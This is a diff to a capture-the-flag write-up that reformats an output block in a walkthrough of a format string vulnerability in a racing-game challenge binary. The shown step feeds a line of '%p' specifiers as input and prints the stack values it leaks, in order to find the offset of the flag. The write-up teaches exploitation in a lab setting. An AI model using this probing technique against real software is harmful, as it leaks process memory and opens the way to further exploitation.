@@ -174,13 +174,16 @@ After doing that, we run the program and try to enter some malicious input after
 Voila! The program output the value of the pointer which is caused by `%p`. So now we know that there is a vulnerability to be exploited here. In the next step, we need to know where is the offset of the flag. To obtain the offset, we use a lot of `%p` to see at which the program outputs the flag, which is `41414141 41414141` in our case. Here's the output.
 
 ```
-Select race:                                                                             1. Highway battle                                                                       2. Circuit
+Select race:
+1. Highway battle
+2. Circuit
 > 1
 [*] Waiting for the race to finish...
 [+] You won the race!! You get 100 coins!
 [+] Current coins: [169]
 [!] Do you have anything to say to the press after your big victory?
 > %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+
 The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:
 0x57a3d200 0x170 0x56595dfa 0x3 (nil) 0x26 0x2 0x1 0x5659696c 0x57a3d200 0x57a3d380 0x41414141 0x41414141 0xf7c5000a 0x170c0c00 0x56596d58 0x56598f8c 0xffaecf38 0x5659638d 0x56596540
 ```
